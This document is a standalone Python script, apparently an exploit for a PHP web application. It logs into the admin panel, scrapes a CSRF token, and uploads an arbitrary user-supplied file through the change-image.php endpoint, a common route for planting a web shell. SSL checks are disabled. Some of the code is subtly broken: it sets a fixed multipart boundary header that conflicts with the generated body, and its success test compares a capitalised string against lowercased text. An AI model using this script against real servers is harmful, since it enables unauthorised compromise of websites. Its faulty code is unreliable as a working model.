import requests
import urllib3
from bs4 import BeautifulSoup
import os

# Disable SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to login to the admin panel
def login(ip, username, password):
    login_url = f"https://{ip}/admin/index.php"
    print("[*] Logging in...")

    # Step 1: First, get the login page to capture any hidden fields (e.g., CSRF token)
    session = requests.Session()
    response = session.get(login_url, verify=False)

    if response.status_code != 200:
        print("[-] Failed to get the login page.")
        return None

    # Use BeautifulSoup to parse the HTML and find hidden form elements (e.g., CSRF token)
    soup = BeautifulSoup(response.text, "html.parser")
    
    # Look for a hidden CSRF token (adjust the token field name if different)
    csrf_token = None
    token_input = soup.find("input", {"name": "csrf_token"})
    if token_input:
        csrf_token = token_input.get("value")
    
    # Prepare payload to login
    payload = {
        "username": username,
        "password": password,
        "login": "Sign In"
    }
    
    if csrf_token:
        payload["csrf_token"] = csrf_token

    # Step 2: POST the login request with session handling
    response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
    
    # Debugging: Print the response URL and body to inspect the redirection or error
    print(f"Login response status: {response.status_code}")
    print(f"Response URL: {response.url}")
    print("Response Body:", response.text[:300])  # Print first 300 chars for better visibility
    
    # Step 3: Check if login was successful by looking for the presence of dashboard.php in the URL or body
    if "dashboard.php" in response.url or "Welcome" in response.text:
        print("[+] Login successful!")
        return session
    else:
        print("[-] Login failed. Please check credentials.")
        return None

# Function to upload a file to the admin panel
def upload_file(session, ip, file_path):
    print("[*] Uploading file...")

    upload_url = f"https://{ip}/admin/change-image.php?imgid=3"
    
    # Define the file upload parameters
    with open(file_path, 'rb') as file_to_upload:
        files = {
            "packageimage": (os.path.basename(file_path), file_to_upload, "application/octet-stream"),
            "submit": ("", "")
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryZPFQDKk0hvosDupP"
        }

        # Perform the POST request for file upload
        response = session.post(upload_url, files=files, headers=headers, verify=False)

        # Check if upload was successful
        if "File uploaded successfully" in response.text.lower():
            print(f"[+] File uploaded successfully to {upload_url}")
        else:
            print("[-] Upload failed.")

if __name__ == "__main__":
    # Get input from the user
    ip = input("Enter IP: ")
    username = input("Enter Username: ")
    password = input("Enter Password: ")

    # Step 1: Login to the admin panel
    session = login(ip, username, password)

    # Check if login was successful
    if session:
        print("[+] Login Success")
        
        # If login is successful, proceed with file upload
        file_name = input("Enter the file path to upload (e.g., r.txt): ")

        # Check if file exists
        if not os.path.isfile(file_name):
            print(f"[-] File {file_name} not found.")
        else:
            # Step 2: Upload the file if login was successful
            upload_file(session, ip, file_name)
    else:
        print("[-] Login Failed.")
